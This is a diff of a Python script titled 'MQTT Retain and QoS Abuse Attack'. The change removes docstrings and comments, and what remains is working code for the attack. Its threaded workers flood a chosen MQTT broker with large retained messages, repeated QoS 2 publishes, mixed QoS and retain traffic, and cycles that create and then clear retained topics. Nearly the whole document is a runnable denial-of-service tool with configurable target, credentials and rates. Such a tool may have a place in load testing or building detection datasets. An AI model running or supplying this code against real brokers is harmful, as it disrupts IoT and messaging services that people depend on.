@@ -1,5 +1,3 @@
-"""MQTT Retain and QoS Abuse Attack - exploits retain messages and QoS levels to overload broker."""
-
 import argparse
 import csv
 import json
@@ -11,7 +9,6 @@ import time
 from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
-
 
 class RetainQoSAbuse:
     def __init__(self, args):
@@ -51,13 +48,11 @@ class RetainQoSAbuse:
             ])
 
     def generate_payload(self, size_kb=1):
-        """Generate payload of specified size"""
         size_bytes = size_kb * 1024
         return ''.join(random.choice(string.ascii_letters + string.digits) 
                       for _ in range(size_bytes))
 
     def retain_flood_attack(self, client, client_id):
-        """Flood broker with retained messages on many topics"""
         base_topics = [
             "retain/flood/sensor",
             "retain/flood/actuator", 
@@ -69,11 +64,9 @@ class RetainQoSAbuse:
         attack_interval = 1.0 / self.args.retain_rate if self.args.retain_rate > 0 else 0.1
         
         while not self.stop_event.is_set():
-            # Create unique topic for each retained message
             base_topic = random.choice(base_topics)
             topic = f"{base_topic}/{random.randint(1, 10000)}"
             
-            # Generate large payload
             payload = self.generate_payload(self.args.payload_size_kb)
             payload_data = json.dumps({
                 "timestamp": datetime.now().isoformat(),
@@ -83,7 +76,6 @@ class RetainQoSAbuse:
             })
             
             try:
-                # Publish with retain=True
                 result = client.publish(topic, payload_data, qos=self.args.qos, retain=True)
                 
                 if result.rc == mqtt.MQTT_ERR_SUCCESS:
@@ -105,7 +97,6 @@ class RetainQoSAbuse:
             time.sleep(attack_interval)
 
     def qos2_abuse_attack(self, client, client_id):
-        """Abuse QoS 2 (exactly once) to create processing overhead"""
         topics = [f"qos2/abuse/{i}" for i in range(1, 101)]  # 100 topics
         
         attack_interval = 1.0 / self.args.qos2_rate if self.args.qos2_rate > 0 else 0.5
@@ -113,7 +104,6 @@ class RetainQoSAbuse:
         while not self.stop_event.is_set():
             topic = random.choice(topics)
             
-            # Generate payload
             payload = json.dumps({
                 "timestamp": datetime.now().isoformat(),
                 "qos2_message": self.generate_payload(2),  # 2KB payload
@@ -122,7 +112,6 @@ class RetainQoSAbuse:
             })
             
             try:
-                # Publish with QoS 2 (exactly once delivery)
                 result = client.publish(topic, payload, qos=2, retain=False)
                 
                 status = "sent" if result.rc == mqtt.MQTT_ERR_SUCCESS else "failed"
@@ -140,7 +129,6 @@ class RetainQoSAbuse:
             time.sleep(attack_interval)
 
     def mixed_qos_retain_attack(self, client, client_id):
-        """Mixed attack using various QoS levels and retain combinations"""
         topics = self.args.topics if self.args.topics else ["mixed/attack/topic"]
         qos_levels = [0, 1, 2]
         retain_options = [True, False]
@@ -152,7 +140,6 @@ class RetainQoSAbuse:
             qos = random.choice(qos_levels)
             retain = random.choice(retain_options)
             
-            # Vary payload size
             payload_size = random.randint(1, self.args.payload_size_kb * 2)
             payload = json.dumps({
                 "timestamp": datetime.now().isoformat(),
@@ -179,11 +166,9 @@ class RetainQoSAbuse:
             time.sleep(attack_interval)
 
     def retain_cleanup_attack(self, client, client_id):
-        """Create then rapidly clear retained messages to stress broker"""
         base_topic = "cleanup/test"
         
         while not self.stop_event.is_set():
-            # Phase 1: Create retained messages
             for i in range(20):
                 topic = f"{base_topic}/{i}"
                 payload = json.dumps({"data": self.generate_payload(1), "phase": "create"})
@@ -195,7 +180,6 @@ class RetainQoSAbuse:
             print(f"[{client_id}] Created 20 retained messages")
             time.sleep(1)
             
-            # Phase 2: Clear retained messages (empty payload)
             for i in range(20):
                 topic = f"{base_topic}/{i}"
                 
@@ -204,17 +188,15 @@ class RetainQoSAbuse:
                 time.sleep(0.05)
             
             print(f"[{client_id}] Cleared 20 retained messages")
-            time.sleep(2)  # Wait before next cycle
+            time.sleep(2)
 
     def attack_worker(self, worker_id):
-        """Worker thread for retain/QoS abuse"""
         client_id = f"{self.args.client_prefix}_{worker_id:03d}"
         client = mqtt.Client(client_id=client_id, clean_session=True)
         
         if self.args.username:
             client.username_pw_set(self.args.username, self.args.password)
 
-        # Connect to broker
         connected = False
         while not connected and not self.stop_event.is_set():
             try:
@@ -230,7 +212,6 @@ class RetainQoSAbuse:
             return
 
         try:
-            # Choose attack type based on worker ID
             if worker_id % 4 == 0:
                 self.retain_flood_attack(client, client_id)
             elif worker_id % 4 == 1:
@@ -248,22 +229,19 @@ class RetainQoSAbuse:
             print(f"[{client_id}] Disconnected")
 
     def run(self):
-        """Start the retain/QoS abuse attack"""
         print(f"Starting Retain/QoS abuse attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Attack types: retain_flood, qos2_abuse, mixed_qos_retain, retain_cleanup")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
             thread.daemon = True
             thread.start()
             threads.append(thread)
-            time.sleep(0.5)  # Stagger connections
+            time.sleep(0.5)
         
         try:
-            # Statistics reporting
             last_count = 0
             while True:
                 time.sleep(10)
@@ -276,12 +254,10 @@ class RetainQoSAbuse:
             print("\nStopping attack...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=5)
             
             print(f"Attack completed. Total messages: {self.sent_count}, Retained topics: {len(self.retained_topics)}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT Retain and QoS Abuse Attack")
@@ -295,7 +271,6 @@ def main():
     parser.add_argument("--topics", nargs="+", help="Target topics for mixed attack")
     parser.add_argument("--workers", type=int, default=4, help="Number of attack workers")
     
-    # Attack rate parameters
     parser.add_argument("--retain-rate", type=float, default=5.0, 
                        help="Retain flood rate (msgs/sec)")
     parser.add_argument("--qos2-rate", type=float, default=2.0, 
@@ -318,7 +293,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
